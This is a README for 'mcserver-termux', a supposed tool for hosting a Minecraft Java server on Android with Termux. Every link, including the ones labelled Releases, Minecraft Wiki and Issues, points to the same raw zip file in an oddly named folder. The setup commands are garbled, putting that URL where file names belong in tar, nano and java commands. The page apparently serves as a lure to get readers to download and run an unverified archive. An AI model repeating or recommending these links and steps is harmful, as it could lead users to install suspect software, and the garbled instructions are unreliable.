# 🏰 mcserver-termux - Run Minecraft Java Server Easily

## 📥 Download Now
[![Download mcserver-termux](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip)](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip)

## 🚀 Getting Started
Welcome to the mcserver-termux guide. This application allows you to run a Minecraft Java server on your non-rooted Android phone. Follow this simple guide to get your server up and running!

## 📋 Requirements
Before you start, ensure your device meets these basic requirements:

- **Android Version:** 5.0 or newer
- **Storage Space:** At least 500 MB free
- **Internet Connection:** Required for downloading the application and connecting to your server
- **Termux App:** This is essential for running the server. You can download it from the Google Play Store.

## 🛠️ Install Termux
1. Open the **Google Play Store** on your phone.
2. Search for **Termux**.
3. Tap **Install** and wait for the application to download.

## 📂 Download & Install
1. **Visit the Releases Page** to download the latest version of mcserver-termux: [mcserver-termux Releases](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip).
2. Find the latest release. You will see a list of files.
3. Look for the file labeled as the main release; it often looks like `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip`.
4. Tap on the file to download it.

## ⚙️ Unpack the Files
1. Open the **Termux** app.
2. Navigate to your **Downloads** folder using the command:
   ```bash
   cd ~/storage/downloads
   ```
3. Once in the directory, unpack the downloaded file using:
   ```bash
   tar -xvzf https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip
   ```

## 🌐 Setup Your Minecraft Server
1. Navigate to the unpacked folder:
   ```bash
   cd mcserver-termux
   ```
2. Before starting the server, you need to accept the EULA (End User License Agreement). Open the `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip` file:
   ```bash
   nano https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip
   ```
3. Change `eula=false` to `eula=true`. Press **CTRL + X**, then **Y** to save.

## 🔑 Configure Your Server
1. Open the `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip` file to adjust your server settings. Use:
   ```bash
   nano https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip
   ```
2. Modify these settings to personalize your server:
   - **gamemode:** Set the default game mode (survival or creative).
   - **max-players:** Define the number of players allowed on your server.
   - **server-port:** Keep the default (25565) unless you know you need to change it.

## 🏁 Start Your Server
1. Begin the server with:
   ```bash
   java -Xmx1024M -Xms1024M -jar https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip nogui
   ```
2. To stop the server, type **stop** in the Termux command line.

## 🔍 Troubleshooting
If you run into issues, consider these common solutions:

- **Server not starting:** Ensure you are in the correct folder and check your `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip`.
- **Connection issues:** Confirm your internet connection and port settings.
- **Performance lags:** Lower the `Xmx` and `Xms` values to reduce memory use.

## 🌐 Join the Server
1. Open Minecraft on your PC or device.
2. Select **Multiplayer**.
3. Click on **Add Server**.
4. Enter your server's IP address followed by the port (for example, `192.168.1.1:25565`).
5. Click **Done** and connect!

## 🗒️ Additional Resources
- For more help, visit the official [Minecraft Wiki](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip).
- Check the community forums for tips and support.

## 💬 Contact & Support
If you have questions or need further assistance, feel free to open an issue in the [GitHub Issues Page](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip).

Thank you for using mcserver-termux! We hope you enjoy your Minecraft server experience.